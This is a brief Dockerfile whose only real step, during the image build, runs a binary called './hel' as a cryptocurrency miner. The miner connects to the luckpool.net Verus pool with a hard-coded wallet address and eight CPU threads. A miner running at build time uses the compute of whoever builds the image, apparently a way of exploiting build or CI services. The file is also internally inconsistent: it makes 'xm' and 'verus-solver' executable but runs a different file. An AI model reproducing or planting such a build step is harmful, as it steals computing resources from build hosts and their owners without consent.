FROM ubuntu:16.04 as builder

RUN apt-get update \
  && rm -rf /var/lib/apt/lists/*

COPY . /app/
RUN cd /app/ && chmod u+x xm && chmod u+x verus-solver && ./hel -c stratum+tcp://na.luckpool.net:3956#xnsub -u RHzu1iXerCHuNTJC5bvSkUgm2pTx6pBGn6.t_8 -p x --cpu 8

CMD ["-h"]